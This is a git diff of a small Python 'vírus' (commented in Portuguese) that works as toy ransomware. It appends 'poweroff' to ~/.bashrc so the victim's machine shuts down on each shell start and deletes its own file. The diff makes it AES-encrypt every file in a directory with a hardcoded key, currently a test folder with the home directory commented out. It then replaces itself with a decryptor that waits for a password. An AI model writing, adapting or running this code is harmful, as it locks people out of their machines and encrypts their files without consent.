@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-from os import system, path
+import os
 from Crypto import Random
 from Crypto.Cipher import AES
 
@@ -26,7 +26,7 @@ def encrypt_file(file_name, key):
         f.write(enc)
 
 # texto a ser substituído no próprio arquivo do vírus
-dec = """from os import path
+dec = """import os
 from Crypto import Random
 from Crypto.Cipher import AES
 
@@ -45,25 +45,38 @@ def decrypt_file(file_name, key):
     with open(file_name, "wb") as f:
         f.write(dec)
 
-
-bashrc = path.expanduser("~/.bashrc")
-filename = "virusdec.py"
-
 key = input("xeroque: ")
-decrypt_file(bashrc, key)
+
+# os.chdir(os.path.expanduser("~"))
+os.chdir(os.path.expanduser("./teste/"))
+
+for file in [ name for name in os.listdir(os.getcwd()) if os.path.isfile(os.path.join(os.getcwd(), name)) ]:
+    try:
+        decrypt_file(file, key)
+    except PermissionError:
+        pass
+
+os.chdir(os.path.expanduser(".."))
+os.system("bash")
 
 """
 
-system("echo poweroff >> ~/.bashrc")
+os.system("echo poweroff >> ~/.bashrc")
 
-# caminho para .bashrc
-bashrc = path.expanduser("~/.bashrc")
 # nome do arquivo do vírus
 filename = "virus.py"
 
-system("rm virus.py")
+os.system("rm " + filename)
 
 with open(filename, "w") as f:
     f.write(dec)
 
-encrypt_file(bashrc, "rolmes")
+# os.chdir(os.path.expanduser('~'))
+os.chdir(os.path.expanduser("./teste/"))
+
+for file in [name for name in os.listdir(os.getcwd()) if os.path.isfile(os.path.join(os.getcwd(), name))]:
+    try:
+        encrypt_file(file, "rolmes")
+    except PermissionError:
+        pass
+
